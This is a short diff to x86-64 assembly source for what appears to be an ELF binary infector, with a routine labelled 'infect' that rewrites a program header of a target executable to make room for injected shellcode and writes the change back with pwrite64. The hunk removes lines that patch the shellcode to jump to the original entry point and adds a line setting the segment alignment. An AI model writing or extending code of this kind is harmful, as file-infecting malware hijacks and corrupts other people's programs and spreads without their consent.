@@ -222,9 +222,10 @@ infect:
     add rax, shellcode_len
     mov [rsi + 40], rax
 
-    ; Update shellcode to jump to the original entry point
-    mov rax, [old_e_entry]
-    mov [shellcode + 23], rax
+    ; Set p_align to 0x1000 (most PT_LOAD segment have P_ALIGN at 0x1000)
+    mov rax, 0x1000
+    mov [rsi + 48], rax
+
 
     ; Write the changes to the file
     mov rax, 18      ; pwrite64
